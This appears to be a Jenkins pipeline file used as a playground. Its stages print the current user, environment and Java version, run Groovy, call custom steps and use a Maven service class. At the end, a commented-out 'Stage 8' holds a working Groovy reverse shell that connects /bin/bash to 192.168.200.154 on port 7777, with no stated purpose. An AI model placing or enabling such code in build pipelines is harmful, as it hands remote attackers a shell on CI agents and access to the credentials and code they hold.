@Library('jenkins-sharedlib') _
import org.jenkins.MySharedLibrary
import org.chriscorp.devops.service.MavenService

pipeline {
    agent any
    environment {
        JAVA_HOME = '/usr/bin/java' 
    }    
    stages {
        stage("This is the verybest jenkins playground stage 1") {
            steps {
                script {
                    def currentUser = sh(returnStdout: true, script: 'whoami').trim()
                    echo "Current user: ${currentUser}"
                }
                sh '''
                    env | grep -e PATH -e JAVA_HOME
                    which java
                    java -version
                    echo $JAVA_HOME
                '''
                
            }
        }
        stage("Stage 2") {
            steps {
                echo "This is stage 2"
                withGroovy(tool:'3.0.8') {
                    sh 'groovy --version'                    
                }
                withGroovy {
                    script{
                        for (int i = 1; i <= 10; i++) {
                            println(i)
                        }                
                    }
                }
            }
        }
        stage("Stage 3") {
            steps {
                echo "This is stage 3"
                mycustomstep()

            }
        }
        stage("Stage 4") {
            steps {
                echo "This is stage 4"
                mycustomstep("Jenkins User")
                script {
                    MavenService mavenS = new MavenService()
                    mavenS.Build()
                    echo "foo"
                    echo mavenS.foo().toString()
                }
            }
        }
        stage("Stage 5")  {
            steps {
                echo "Stage 5"
                testfeatures()
            }
        }
        /*
        stage("Stage 8")  {
            steps {
                script {
                    String host="192.168.200.154";
                    int port=7777;
                    String cmd="/bin/bash";
                    Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
                }
            }
        } */       
    }
}

